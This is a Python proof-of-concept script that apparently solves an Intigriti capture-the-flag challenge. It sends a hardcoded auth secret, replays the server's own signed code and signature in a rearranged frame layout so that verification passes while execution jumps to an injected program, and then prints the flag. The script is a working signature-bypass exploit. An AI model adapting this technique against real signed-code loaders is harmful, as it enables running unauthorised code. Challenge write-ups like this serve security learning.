#!/usr/bin/env python3
# Intigriti Challenge 1126 - simple PoC
import socket, ssl, re
HOST = "challenge-1126.challenges.intigriti.io"
SECRET = (b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_"
          b"INTIGRITI_341465b5b427f6e7c2125b300a74a033")  # 106 bytes, from the public binary

def frame(cmd, data=b""):                       # wire format: 'w' + length + command + data
    return b"w" + len(data).to_bytes(4, "little") + cmd + data

def post(body):                                 # send one POST /custom_protocol
    req = (f"POST /custom_protocol HTTP/1.1\r\nHost: {HOST}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    ss = ssl._create_unverified_context().wrap_socket(
        socket.create_connection((HOST, 443), timeout=30), server_hostname=HOST)
    ss.sendall(req); ss.settimeout(30); out = b""
    try:
        while (c := ss.recv(65536)): out += c
    except socket.timeout: pass
    ss.close()
    return out.split(b"\r\n\r\n", 1)[-1]        # return only the HTTP body

# 1) Ask the server for its own signed example (the HELP blob).
blob = post(SECRET + frame(b"HELP"))
take = lambda tag, n: blob[blob.index(tag) + 4:][:n]   # payload follows the 4-byte command
code, data, sig = take(b"CODE", 396), take(b"DATA", 424), take(b"SIGN", 256)

# 2) Bypass: the signed range is CODE_len + DATA_len, but execution starts at DATA_off.
#    Sending the whole signed message inside CODE makes the signed range 820 bytes.
#    A zero-length DATA frame then keeps that range unchanged while moving the
#    execution pointer past the signature, to our own program in EXEC.
program = b">" * 256 + b"." + b">." * 100        # tape+0x100 = flag; print it
body = (SECRET
        + frame(b"CODE", code + data)           # signed range [0, 820) = genuine bytes
        + frame(b"SIGN", sig)                   # genuine signature at offset 820
        + frame(b"DATA")                        # DATA_off = 1076, DATA_len = 0
        + frame(b"EXEC", program))              # our program copied at 1076
resp = post(body)
m = re.search(rb"INTIGRITI\{[^}]*\}", resp)
print(resp)
print("FLAG:", m.group(0).decode() if m else "NOT FOUND")
